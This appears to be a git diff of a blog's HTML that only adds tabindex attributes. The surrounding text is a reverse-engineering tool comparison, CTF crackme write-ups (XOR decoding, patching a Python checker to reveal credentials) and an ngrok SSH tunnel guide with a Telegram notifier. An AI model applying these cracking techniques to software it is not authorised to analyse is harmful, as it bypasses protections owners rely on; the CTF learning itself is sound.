 &lt;h2 id=&#34;comparision&#34;&gt;Comparision&lt;/h2&gt;
 &lt;p&gt;For detailed description of features go to corresponding chapters below.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;[Bracketed]&lt;/strong&gt; character means that in my opinion specified tool is the &amp;ldquo;best&amp;rdquo; in the specified category (feature), it is not extra scored, but it may be useful for somebody.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;|                      | Price | Score | Cross-platform |   Multi-arch  |       Decompiler       | Debugger | Plugins (1)  | Signatures (2)  | Patching (3)  | Symbolic constants |
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;|                      | Price | Score | Cross-platform |   Multi-arch  |       Decompiler       | Debugger | Plugins (1)  | Signatures (2)  | Patching (3)  | Symbolic constants |
 |:--------------------:|:-----:|:-----:|:--------------:|:-------------:|:----------------------:|:--------:|:------------:|:---------------:|:-------------:|:------------------:|
 | BinaryNinja 2.0.2097 |  $150 |  7.0  |        +       |       +       |            +           |     +    |       +      |        +        |      [+]      |          -         |
 |     Ghidra 9.1.2     |  Free |  6.5  |        +       |       +       |           [+]          |     -    |       ~      |        +        |       +       |          +         |
@@ -1664,7 +1664,7 @@ undefined8 main(void) { int64_t iVar1; undefined8 uVar2; uint32_t var_8h; undefi
 &lt;p&gt;Warmup : Welcome to securinets CTF&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;In this task we are dealing with very simple function main:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;undefined8 &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;undefined8 &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
 {
     &lt;span style=&#34;color:#66d9ef&#34;&gt;int64_t&lt;/span&gt; iVar1;
     undefined8 uVar2;
@@ -1694,7 +1694,7 @@ undefined8 main(void) { int64_t iVar1; undefined8 uVar2; uint32_t var_8h; undefi
 }
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this function the &lt;code&gt;memfrob&lt;/code&gt; is used, from manual you can learn that this function is xoring buffer with key &lt;code&gt;42&lt;/code&gt;, solution:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;,
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;,
 &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;]
 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a:
@@ -1705,7 +1705,7 @@ undefined8 main(void) { int64_t iVar1; undefined8 uVar2; uint32_t var_8h; undefi
 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join([chr(c) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; r])
 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;l3t&amp;#39;s_w4rm_1t_up_boy&amp;#34;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And execution:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Welcome to SECURINETS CTF
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Welcome to SECURINETS CTF
 l3t&amp;#39;s_w4rm_1t_up_boy
 Good job
 You can submit with securinets{l3t&amp;#39;s_w4rm_1t_up_boy}
@@ -1735,7 +1735,7 @@ $ python snake.py ___________.__ _________ __ \__ ___/| |__ ____ / _____/ ____ _
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
 &lt;p&gt;We have got the python script that is waiting for some username and password:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ python snake.py
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ python snake.py
 
 ___________.__               _________              __
 \__    ___/|  |__   ____    /   _____/ ____ _____  |  | __ ____
@@ -1757,7 +1757,7 @@ Wrong username try harder
 &lt;p&gt;We can see partially obfuscated variables, that are later xored with some values, let&amp;rsquo;s try to get username.&lt;/p&gt;
 &lt;h3 id=&#34;username&#34;&gt;Username&lt;/h3&gt;
 &lt;p&gt;Username is combined from random dropped variables that are of course hex-encoded letters (i.e &lt;code&gt;db = &#39;\x6e&#39;&lt;/code&gt;).&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter your username&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter your username&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; user_input &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; slither:
     &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
 
@@ -1766,11 +1766,11 @@ Wrong username try harder
     exit()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To get correct username we should know the slither value, we can easly get it by printing before verification check.&lt;/p&gt;
 &lt;p&gt;I&amp;rsquo;ve decided to &amp;lsquo;patch&amp;rsquo; above code into:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; slither
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; slither
 print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;====&amp;gt; Username: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(user_input)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; user_input &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; slither:
     &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;&amp;gt; python snake.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; python snake.py
 
 ___________.__               _________              __
 \__    ___/|  |__   ____    /   _____/ ____ _____  |  | __ ____
@@ -1790,7 +1790,7 @@ PASSWORD
 Wrong password try harder
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yay, so the username is &lt;code&gt;anaconda&lt;/code&gt;, now we need to guess password.&lt;/p&gt;
 &lt;h3 id=&#34;password&#34;&gt;Password&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pass_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter your password&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pass_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter your password&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
 &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; passes &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pass_input:
     &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; chars:
         &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; passes &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; str(chr(char)):
@@ -1804,7 +1804,7 @@ Wrong password try harder
 &lt;p&gt;We can also get all chars array (&lt;code&gt;[117, 100, 118, 118, 114, 106, 119, 97, 36, 36, 126, 114, 115, 125, 42, 115, 125, 42, 107, 42, 126, 124, 121, 118, 118]&lt;/code&gt;) and print this as string: &lt;code&gt;&amp;quot;udvvrjwa$$~rs}*s}*k*~|yvv&amp;quot;&lt;/code&gt;, but this is not our password :/&lt;/p&gt;
 &lt;p&gt;Making a step back, by ignoring loop where chars are incremented by &lt;code&gt;0xA&lt;/code&gt; we can read that chars is just a message: &lt;code&gt;&amp;quot;this is a troll&amp;quot;&lt;/code&gt;, so the real password is somewhere else.&lt;/p&gt;
 &lt;p&gt;We can also notice unused variable password: &lt;code&gt;password = [0x69, 0x74, 0x73, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x65, 0x61, 0x73, 0x79]&lt;/code&gt;, but this is just another rabbit hole:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;]
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;]
 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; password:
 &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;   s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(c)
@@ -1812,7 +1812,7 @@ Wrong password try harder
 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; s
 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;its not that easy&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With some additional prints we can notice that output and &lt;code&gt;lock = 5&lt;/code&gt; variable are the same:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;==&amp;gt; chains: this is a troll
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;==&amp;gt; chains: this is a troll
 ==&amp;gt; keys: password!!
 ==&amp;gt; auth: keep trying
 Your number is 774
@@ -1820,7 +1820,7 @@ Lock 5
 ==&amp;gt; chars1: udvvrjwa$$
 ==&amp;gt; chars2: udvvrjwa$$~rs}*s}*k*~|yvv
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;My simplified code which gives above result:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python2.7&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python2.7&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random 
 
 &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;print_array&lt;/span&gt;(name, chars):
@@ -1915,14 +1915,14 @@ pass_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_input(&l
 &lt;p&gt;After you have account you need to download client and activate account with your API key (follow the instuctions from web service).&lt;/p&gt;
 &lt;h2 id=&#34;2-verify-that-tunnel-works&#34;&gt;2. Verify that tunnel works&lt;/h2&gt;
 &lt;p&gt;Create ngrok config file (under &lt;code&gt;~/.ngrok2/ngrok.yml&lt;/code&gt;):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;authtoken&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;lt;YOUR_TOKEN_HERE&amp;gt;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;authtoken&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;lt;YOUR_TOKEN_HERE&amp;gt;&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;tunnels&lt;/span&gt;:
         &lt;span style=&#34;color:#f92672&#34;&gt;sshglob&lt;/span&gt;:
                 &lt;span style=&#34;color:#f92672&#34;&gt;proto&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;tcp&lt;/span&gt;
                 &lt;span style=&#34;color:#f92672&#34;&gt;addr&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Above config setups tunnel &lt;code&gt;sshglob&lt;/code&gt; which forwards locally hosted &lt;code&gt;tcp/22&lt;/code&gt; - in this case SSH service. You should change these values according to your needs.&lt;/p&gt;
 &lt;p&gt;Now you can try to start ngrok &lt;code&gt;ngrok start sshglob&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;ngrok by @inconshreveable                                                            (Ctrl+C to quit)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;ngrok by @inconshreveable                                                            (Ctrl+C to quit)
 
 Session Status                online
 Account                       whoami (Plan: Free)
@@ -1938,7 +1938,7 @@ Connections                   ttl     opn     rt1     rt5     p50     p90
 &lt;h2 id=&#34;3-bypass-random-port-issue&#34;&gt;3. Bypass random port issue&lt;/h2&gt;
 &lt;p&gt;If you run ngrok couple of times you should notice that every time you service is running at random port, to bypass this issue you can by a premium or make some additional steps presented below.&lt;/p&gt;
 &lt;h3 id=&#34;install-dependencies&#34;&gt;Install dependencies&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt install -y python3 python3-pip curl jq
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt install -y python3 python3-pip curl jq
 pip3 install telegram
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;setup-telegram-bot&#34;&gt;Setup Telegram bot&lt;/h3&gt;
 &lt;p&gt;For myself I decided to create Telegram&lt;a href=&#34;#references&#34;&gt;[2]&lt;/a&gt; bot which will send me external hostname and random IP address. Ofc you need to have created Telegram account to follow next steps.&lt;/p&gt;
@@ -1946,13 +1946,13 @@ pip3 install telegram
 &lt;li&gt;Start conversation with telegram &lt;a href=&#34;https://t.me/botfather&#34;&gt;Botfather&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Type commands in Botfather conversation:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/newbot
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/newbot
 mysuper_bot &lt;span style=&#34;color:#75715e&#34;&gt;# replace &amp;#34;mysuper&amp;#34; with your bot name&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
 &lt;li&gt;Copy API key and start conversation with your bot&lt;/li&gt;
 &lt;li&gt;Type something in the chat &amp;amp; run the below code:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sys &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argv
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sys &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; argv
 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; telegram
 
 bot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; telegram&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Bot(token&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YOUR_API_KEY&amp;#34;&lt;/span&gt;)
@@ -1961,7 +1961,7 @@ print(bot&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getUpdates())
 &lt;li&gt;Copy &lt;code&gt;chat_id&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;Create script &lt;code&gt;tsend.py&lt;/code&gt;:&lt;/li&gt;
 &lt;/ol&gt;
